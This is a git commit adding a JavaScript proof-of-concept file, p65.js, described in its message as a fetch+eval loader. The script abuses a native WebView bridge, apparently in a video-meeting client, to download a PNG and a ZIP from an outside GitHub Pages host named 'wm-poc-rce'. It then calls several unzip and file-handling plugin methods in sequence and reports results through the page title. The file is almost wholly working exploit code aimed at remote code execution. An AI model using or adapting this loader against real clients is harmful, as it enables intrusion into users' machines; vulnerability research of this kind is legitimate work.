14e465d2aa25ad10fd797312fe7da3bb43f770f3
whs <whs@local>
2026-09-05 14:04:49 -0400

    p65 short leftover fetch+eval loader

---
+++ p65.js
@@ -0,0 +1,40 @@
+(function(){
+  document.title='P65JS:'+location.host;
+  window.__p=function(r){
+    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+    try{
+      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+        module:'CommonPlugin',method:'PrintLog',
+        param:{log:JSON.stringify(r)},callId:'LOG'
+      }));
+    }catch(e){}
+    document.title='P65CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
+  };
+  function c(id,mod,m,p){
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+      callback:'window.__p',module:mod,method:m,param:p,callId:id
+    }));
+  }
+  var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
+  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
+  var q=[
+    ['C0','VirtualBackgroundWebPlugin','GetWebAppVirtualBackgroundConfig',{}],
+    ['C1','VirtualBackgroundWebPlugin','DownloadFile',{url:png,over_write:true}],
+    ['C2','VirtualBackgroundWebPlugin','HandleSetVirtualBackground',{url:png,over_write:true,backgroundType:'picture'}],
+    ['C5','VirtualBackgroundWebPlugin','DownloadFile',{url:zip,over_write:true}],
+    ['I2','IdeaWebViewPlugin','GetWebViewSharePath',{}],
+    ['I6','IdeaWebPlugin','GetWebViewSharePath',{}],
+    ['U1','CommonPlugin','UnzipFile',{url:zip}],
+    ['U2','CommonPlugin','DownloadAndUnzip',{url:zip}],
+    ['U3','CommonPlugin','UnzipResource',{url:zip}],
+    ['H1','CommonPlugin','GetPerformance',{}]
+  ];
+  var i=0;
+  function n(){
+    if(i>=q.length){document.title='P65-DONE';return}
+    var x=q[i++];
+    c(x[0],x[1],x[2],x[3]);
+    setTimeout(n,1100);
+  }
+  n();
+})();
